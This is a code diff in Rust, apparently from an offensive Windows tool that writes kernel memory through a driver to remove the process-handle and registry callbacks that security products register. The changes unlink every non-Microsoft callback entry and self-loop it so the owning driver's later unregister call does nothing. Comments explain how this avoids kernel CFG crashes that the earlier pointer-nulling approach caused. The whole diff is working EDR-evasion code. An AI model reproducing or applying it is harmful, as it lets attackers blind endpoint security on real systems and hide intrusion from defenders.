@@ -396,6 +396,36 @@ fn find_ob_callback_list_off(
     Err("_OBJECT_TYPE CallbackList offset not found".into())
 }
 
+/// Detach a doubly-linked LIST_ENTRY node from its list without touching any
+/// function pointer that the kernel might later invoke.
+///
+///   entry.Flink.Blink = entry.Blink
+///   entry.Blink.Flink = entry.Flink
+///   entry.Flink        = entry   (self-loop → subsequent Remove is a no-op)
+///   entry.Blink        = entry
+///
+/// This is kCFG-safe: nothing that survives on the entry is ever reached from
+/// the dispatcher's iteration, so no indirect call to a mutated pointer takes
+/// place. NULLing embedded function pointers, by contrast, bugchecks 0x139
+/// arg 0xA the moment kCFG-instrumented dispatch code reaches them.
+fn unlink_list_entry(
+    drv: &Astra, cr3: u64, entry_va: u64,
+) -> Result<(u64, u64), String> {
+    let flink = vread_u64(drv, cr3, entry_va)?;
+    let blink = vread_u64(drv, cr3, entry_va + 8)?;
+    if is_kptr(flink) {
+        vwrite(drv, cr3, flink + 8, &blink.to_le_bytes())?;
+    }
+    if is_kptr(blink) {
+        vwrite(drv, cr3, blink, &flink.to_le_bytes())?;
+    }
+    // Self-loop so that CmUnRegisterCallback / ObUnRegisterCallbacks called
+    // later by the owning driver sees an already-removed entry and no-ops.
+    vwrite(drv, cr3, entry_va,     &entry_va.to_le_bytes())?;
+    vwrite(drv, cr3, entry_va + 8, &entry_va.to_le_bytes())?;
+    Ok((flink, blink))
+}
+
 /// _OB_CALLBACK_ENTRY (as used by ObRegisterCallbacks):
 ///   +0x00  LIST_ENTRY CallbackList
 ///   +0x10  OB_OPERATION Operations (u32)
@@ -404,6 +434,10 @@ fn find_ob_callback_list_off(
 ///   +0x20  POBJECT_TYPE ObjectType
 ///   +0x28  POB_PRE_OPERATION_CALLBACK  PreOperation
 ///   +0x30  POB_POST_OPERATION_CALLBACK PostOperation
+///
+/// Neutralization is by UNLINK, not by nulling PreOperation/PostOperation.
+/// Nulling would leave a live indirect-call target inside the list that
+/// kCFG bugchecks on the next OpenProcess/DuplicateHandle traversal.
 fn wipe_ob_list(
     drv: &Astra, cr3: u64, head_va: u64, mods: &[KernelModule], label: &str,
 ) -> Result<usize, String> {
@@ -412,25 +446,30 @@ fn wipe_ob_list(
     let mut budget = 128;
     while cur != head_va && budget > 0 && is_kptr(cur) {
         budget -= 1;
-        let pre  = vread_u64(drv, cr3, cur + 0x28).unwrap_or(0);
-        let post = vread_u64(drv, cr3, cur + 0x30).unwrap_or(0);
+        // Read the forward link BEFORE any mutation so unlink doesn't lose
+        // the iterator.
+        let flink = vread_u64(drv, cr3, cur).unwrap_or(0);
+        let pre   = vread_u64(drv, cr3, cur + 0x28).unwrap_or(0);
+        let post  = vread_u64(drv, cr3, cur + 0x30).unwrap_or(0);
         let fp = if is_kptr(pre) { pre } else if is_kptr(post) { post } else { 0 };
         let owner = if fp == 0 { "<empty>".to_string() } else { owner_name(mods, fp) };
         let keep = fp == 0 || is_ms_core(&owner);
         if !keep {
-            println!("    [{label} @ 0x{:X}] disable <- {}  pre=0x{:X} post=0x{:X}",
+            println!("    [{label} @ 0x{:X}] unlink <- {}  pre=0x{:X} post=0x{:X}",
                 cur, owner, pre, post);
-            let _ = vwrite(drv, cr3, cur + 0x14, &[0u8]);              // Enabled = FALSE
-            let _ = vwrite(drv, cr3, cur + 0x28, &0u64.to_le_bytes()); // PreOperation  = NULL
-            let _ = vwrite(drv, cr3, cur + 0x30, &0u64.to_le_bytes()); // PostOperation = NULL
-            wiped += 1;
+            // Also flip Enabled to 0 so ObGetObjectSecurity-adjacent paths
+            // that check the byte before the list-walk also skip it.
+            let _ = vwrite(drv, cr3, cur + 0x14, &[0u8]);
+            if let Err(e) = unlink_list_entry(drv, cr3, cur) {
+                eprintln!("    [{label} @ 0x{:X}] unlink failed: {e}", cur);
+            } else {
+                wiped += 1;
+            }
         } else {
             println!("    [{label} @ 0x{:X}] keep    {}", cur, owner);
         }
-        cur = match vread_u64(drv, cr3, cur) {
-            Ok(v) if v == head_va || is_kptr(v) => v,
-            _ => break,
-        };
+        // Continue via the ORIGINAL Flink (unlink self-looped this entry).
+        cur = if flink == head_va || is_kptr(flink) { flink } else { break };
     }
     Ok(wiped)
 }
@@ -480,10 +519,13 @@ fn resolve_cmp_callback_head(
     Err("CmpCallbackListHead not resolved".into())
 }
 
-/// _CM_CALLBACK_CONTEXT_BLOCK varies slightly across builds. The `Function`
-/// pointer lives somewhere in +0x18..+0x40. We identify it by scanning that
-/// window for the first offset whose value is a kernel pointer belonging to a
-/// loaded module.
+/// `_CM_CALLBACK_CONTEXT_BLOCK` starts with a `LIST_ENTRY` at offset 0. The
+/// `Function` pointer lives somewhere in +0x18..+0x40 depending on build.
+/// We do NOT null it — that leaves an indirect-call landmine that kCFG will
+/// detonate the next time the registry callback dispatcher (`CmpCallCallBacksEx`)
+/// walks the list (which happens on every `NtOpenKey`, so within milliseconds).
+/// Instead we UNLINK the entry from `CmpCallbackListHead` so no dispatch path
+/// ever reaches this block.
 fn wipe_cm_list(
     drv: &Astra, cr3: u64, head_va: u64, mods: &[KernelModule],
 ) -> Result<usize, String> {
@@ -492,6 +534,10 @@ fn wipe_cm_list(
     let mut budget = 128;
     while cur != head_va && budget > 0 && is_kptr(cur) {
         budget -= 1;
+        // Save Flink BEFORE unlink so iteration continues correctly.
+        let flink = vread_u64(drv, cr3, cur).unwrap_or(0);
+
+        // Identify the Function pointer (for logging + ownership decision only).
         let mut fp = 0u64;
         let mut fp_off = 0u64;
         for off in (0x18..0x40u64).step_by(8) {
@@ -502,17 +548,17 @@ fn wipe_cm_list(
         }
         let owner = if fp == 0 { "<unknown>".to_string() } else { owner_name(mods, fp) };
         if fp != 0 && !is_ms_core(&owner) {
-            println!("    [Cm @ 0x{:X}] NULL <- {}  (fn+0x{:X}=0x{:X})",
+            println!("    [Cm @ 0x{:X}] unlink <- {}  (fn+0x{:X}=0x{:X})",
                 cur, owner, fp_off, fp);
-            let _ = vwrite(drv, cr3, cur + fp_off, &0u64.to_le_bytes());
-            wiped += 1;
+            if let Err(e) = unlink_list_entry(drv, cr3, cur) {
+                eprintln!("    [Cm @ 0x{:X}] unlink failed: {e}", cur);
+            } else {
+                wiped += 1;
+            }
         } else {
             println!("    [Cm @ 0x{:X}] keep    {}", cur, owner);
         }
-        cur = match vread_u64(drv, cr3, cur) {
-            Ok(v) if v == head_va || is_kptr(v) => v,
-            _ => break,
-        };
+        cur = if flink == head_va || is_kptr(flink) { flink } else { break };
     }
     Ok(wiped)
 }
